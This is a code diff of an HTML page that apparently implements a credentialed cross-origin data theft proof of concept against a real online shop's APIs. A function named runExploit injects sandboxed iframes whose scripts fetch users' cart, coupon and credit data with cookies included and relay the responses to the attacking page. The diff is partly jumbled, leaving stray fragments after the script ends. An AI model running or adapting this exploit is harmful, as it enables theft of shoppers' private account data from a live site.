@@ -65,64 +65,90 @@ word-break:break-word;
 </div>
 
 <iframe id="sandboxFrame" sandbox="allow-scripts" style="display:none"></iframe>
+<script>
+
+function request(url,label){
+
+let frame=document.createElement("iframe")
+
+frame.sandbox="allow-scripts"
+
+frame.style.display="none"
+
+let payload=`
 
 <script>
 
-const endpoints={
+fetch("${url}",{
+credentials:"include"
+})
 
-cart:"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-count:"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-coupon:"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-credit:"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
+.then(r=>r.text())
+.then(data=>{
 
-}
-
-function createCard(name,method){
-
-let id=method+"_"+name
-
-let div=document.createElement("div")
-div.className="card"
-
-div.innerHTML=
-"<b>"+method.toUpperCase()+" → "+name+"</b>"+
-"<div>Status: <span id='"+id+"_status'>waiting</span></div>"+
-"<pre id='"+id+"_data'></pre>"
-
-document.getElementById("results").appendChild(div)
-
-}
-
-for(let e in endpoints){
-
-createCard(e,"sandbox")
-createCard(e,"data")
-createCard(e,"blob")
-
-}
-
-window.addEventListener("message",e=>{
-
-let d=e.data
-let id=d.method+"_"+d.endpoint
-
-document.getElementById(id+"_status").innerText=d.status
-document.getElementById(id+"_data").innerText=d.body
+parent.postMessage({
+label:"${label}",
+status:"SUCCESS",
+body:data
+},"*")
 
 })
 
-function runTests(){
+.catch(e=>{
 
-runSandbox()
-runData()
-runBlob()
+parent.postMessage({
+label:"${label}",
+status:"ERROR",
+body:e.toString()
+},"*")
+
+})
+
+<\/script>
+
+`
+
+frame.srcdoc=payload
+
+document.body.appendChild(frame)
 
 }
 
-function buildScript(method){
+window.addEventListener("message",function(e){
 
-return `
-<script>
+let label=e.data.label
+
+document.getElementById(label+"_status").innerText=e.data.status
+
+document.getElementById(label+"_data").innerText=e.data.body
+
+})
+
+function runExploit(){
+
+request(
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+"cart"
+)
+
+request(
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+"count"
+)
+
+request(
+"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+"coupon"
+)
+
+request(
+"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
+"credit"
+)
+
+}
+
+</script>
 
 const endpoints=${JSON.stringify(endpoints)}
 
